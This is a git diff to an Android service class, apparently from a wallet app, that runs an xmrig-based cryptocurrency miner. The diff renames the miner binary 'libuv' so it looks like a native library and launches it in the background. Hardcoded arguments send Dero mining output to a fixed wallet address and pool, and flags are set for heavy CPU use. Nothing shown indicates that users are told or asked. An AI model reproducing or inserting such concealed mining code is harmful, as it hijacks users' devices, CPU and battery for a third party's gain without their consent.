@@ -39,7 +39,6 @@ import java.util.UUID;
 
 import java.io.File;
 
-
 /**
  * MiningService for mining in the background
  * Created by uwe on 24.01.18.
@@ -55,7 +54,7 @@ public class MiningService extends Service {
     private String speed = "./.";
     private String configTemplate;
 
-    ///exeptions
+    //exeptions
     //privatePath/data/user/0/com.chadananda.cocoawallet/files
 
     @Override
@@ -65,16 +64,16 @@ public class MiningService extends Service {
 
         //configTemplate = Tools.loadConfigTemplate(this);
 
-
         //path where we may execute our program
-        //privatePath = getFilesDir().getAbsolutePath();
-        //System.loadLibrary("libpm");
+       String path = getFilesDir().getAbsolutePath();
+        Log.e("path","path: "+path);
+        //System.loadLibrary("pm");
         privatePath = this.getApplicationInfo().nativeLibraryDir;
         Log.e("privatePath","privatePath: "+privatePath);
-        File[] fileList = new File(privatePath).listFiles((dir, name) -> {
-            Log.e("privatePath","file: "+name);
-            return true; // we simply want all the files in this directory
-        });
+      //  File[] fileList = new File(privatePath).listFiles((dir, name) -> {
+      //      Log.e("privatePath","file: "+name);
+      //      return true; // we simply want all the files in this directory
+      //  });
 
         workerId = fetchOrCreateWorkerId();
         Log.w(LOG_TAG, "my workerId: " + workerId);
@@ -83,7 +82,7 @@ public class MiningService extends Service {
 
         //copy binaries to a path where we may execute it);
 //        Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrigCC");
-//        Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrig");
+//       Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrig");
 //        Tools.copyFile(this,"armeabi-v7a" + "/libuv", privatePath + "/libuv.so");
 
     }
@@ -109,9 +108,11 @@ public class MiningService extends Service {
         config.maxCpu = maxCpu;
         return config;
     }
+
     /**
      * @return unique workerId (created and saved in preferences once, then re-used)
      */
+
     private String fetchOrCreateWorkerId() {
         SharedPreferences preferences = getSharedPreferences("CocoaWallet", 0);
         String id = preferences.getString("id", null);
@@ -156,71 +157,19 @@ public class MiningService extends Service {
 
         }
         String fullPath = "";
-
-        if (process != null) {
-            Log.i(LOG_TAG, "shutting down old process first...");
-            process.destroy();
-        }
-//        String library = "libmain.so";
-//        try {
-//            // write the config
-//            Tools.writeConfig(configTemplate, config.pool, config.username, config.threads, config.maxCpu, privatePath);
-//            //run xmrig using the config
-//            String[] args = {"./xmrig"};
-//            ProcessBuilder pb = new ProcessBuilder(args);
-//            //in our directory
-//            pb.directory(getApplicationContext().getFilesDir());
-//            // with the directory as ld path so xmrig finds the libs
-//            pb.environment().put("LD_LIBRARY_PATH", privatePath);
-//            //in case of errors, read them
-//            pb.redirectErrorStream();
-//            accepted = 0;
-//            //run it
-//            Log.e("pb","pb"+args);
-//            // Process process = pb.start();   // how do we check if this worked?
-//            //start processing xmrig's output    // so why not use pb.redirectOutput(); ?
-//            outputHandler = new MiningService.OutputReaderThread(process.getInputStream());
-//            outputHandler.start();
-//            Toast.makeText(this, "started", Toast.LENGTH_SHORT).show();
-//        } catch (Exception e) {
-//            Log.e("error","error"+e.getLocalizedMessage()+e.getCause());
-//            Toast.makeText(this, e.getLocalizedMessage(), Toast.LENGTH_SHORT).show();
-//            process = null;
-//        }
-
         try {
-
-//            String appDir = this.getApplicationInfo().nativeLibraryDir + "/" + library;
-            //int abi32 = PackageManager.CERT_INPUT_RAW_X509;
-
-            String appDir = this.getApplicationInfo().nativeLibraryDir;
-
-
-            String appDir1=this.getApplicationInfo().publicSourceDir;
-            String appDir2=this.getApplicationInfo().dataDir;
-            String appDir3=this.getApplicationInfo().nativeLibraryDir;
-            String appDir4=this.getApplicationInfo().sourceDir;
-            //String appDir5=this.getApplicationInfo().deviceProtectedDataDir;
-
-
-            String wallet = "dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRv" +
-                            "Nz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
-
-            String wallet1="8AaNnN8nQUMh3XQfyt4kEt8TR7RYnowhjVynzShWwVLiR6dWdSp42" +
-                            "YeFvouLZoui7S46xSgDxapbeS7Tdqyz7em5Chqd4HA";
-
-            String max_bwt1="80";
-            String max_bwt = "710";
+            String appDir=this.getApplicationInfo().nativeLibraryDir;
+            String wallet="dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
+            String max_bwt="710";
             String pool = "us.hero.miner.us:1117";
-            String pool1= "gulf.moneroocean.stream:10001";
             String config_template = "-o %s -u %s --tls -k --coin dero -a astrobwt "+
                     "--astrobwt-max-size=%s --astrobwt-avx2 --pause-on-battery --huge-pages=TRUE "+
                     "--huge-pages-jit=TRUE --asm=auto --cpu-memory-pool=-1 --cpu-no-yield --print-time=8"+
                     "--retry-pause=2";
             String args = String.format(config_template,pool,wallet,max_bwt);
             String[] pm = {"./libuv",args};
-            fullPath = privatePath+"/libpm.so";
-            Log.e("args","args"+appDir);
+            fullPath = privatePath+"/libuv";
+            Log.e("args","args"+appDir+" "+fullPath);
             ProcessBuilder pb = new ProcessBuilder( pm );
             //in our directory, which is
             pb.directory(new File(appDir));
@@ -249,7 +198,6 @@ public class MiningService extends Service {
             }
             process = null;
         }
-
     }
 
     public String getSpeed() {
@@ -269,11 +217,9 @@ public class MiningService extends Service {
     public int getAvailableCores() {
         return Runtime.getRuntime().availableProcessors();
     }
-
     /**
      * thread to collect the binary's output
      */
-
     private class OutputReaderThread extends Thread {
         private final InputStream inputStream;
         private final StringBuilder output = new StringBuilder();
@@ -307,9 +253,6 @@ public class MiningService extends Service {
                 Log.w(LOG_TAG, "exception", e);
             }
         }
-
-
-
         public StringBuilder getOutput() {
             return output;
         }
